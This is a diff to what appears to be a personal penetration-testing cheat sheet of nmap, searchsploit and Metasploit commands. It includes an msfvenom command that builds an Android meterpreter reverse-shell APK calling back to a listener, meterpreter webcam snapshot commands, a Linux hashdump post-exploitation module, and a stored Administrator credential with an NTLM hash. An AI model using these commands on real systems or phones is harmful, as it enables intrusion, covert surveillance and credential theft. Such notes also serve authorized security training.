@@ -9,10 +9,10 @@ searchsploit --nmap hosts.xml --json 2>&1 | tee result.json
 nmap -T4 -A -v 192.168.1.1 -sV -oX hosts.xml  
 searchsploit --nmap hosts.xml --json | tee router_hosts.json  
   
-- Wireshark deauth packages Filter:  
+- Wireshark deauth packages:  
 wlan.fc.type_subtype == 12  
 
-## MSF Reverse Shell 101  
+## MSF 101  
 
 msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.110.126 LPORT=4444 -o android_client.apk  
   
@@ -30,7 +30,9 @@ Meterpreter:
 webcam_list  
 webcam_snap  
   
-MSF ddbb:  
+## MSF  
+
+ddbb:  
 systemctl start postgresql  
 msfdb init  
 db_status  
@@ -42,10 +44,33 @@ create -> workspace -a lab1
 delete -> workspace -d lab1  
   
 Other:  
-dp_nmap -A 192.168.1.1  
-db_import /root/msfu/nmapScan  
+db_nmap -A 192.168.1.1  
+  
+List by:  
 hosts (display scan)  
 hosts -c address,os_flavor -S Linux (-c FILTER, -S search)  
+services -c name,info -S http  
+services -c name,info -p 445  
+services -c port,proto,state -p 70-81  
   
-Backup  
+Backup:  
 db_export -f xml /root/msfu/Exported.xml  
+db_import /root/msfu/nmapScan  
+services -s http -c port 172.16.194.134 -o /root/msfu/http.csv  
+  
+Credentials:  
+creds  
+(add) creds -a 172.16.194.134 -p 445 -u Administrator -P 7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::  
+  
+Loot i.e.:  
+use post/linux/gather/hashdump  
+run  
+loot  (--add to save to ddbb, default just lists)  
+  
+Exploits:  
+use  
+show targets  
+show payloads  
+show options  
+show advanced  
+show evasion  
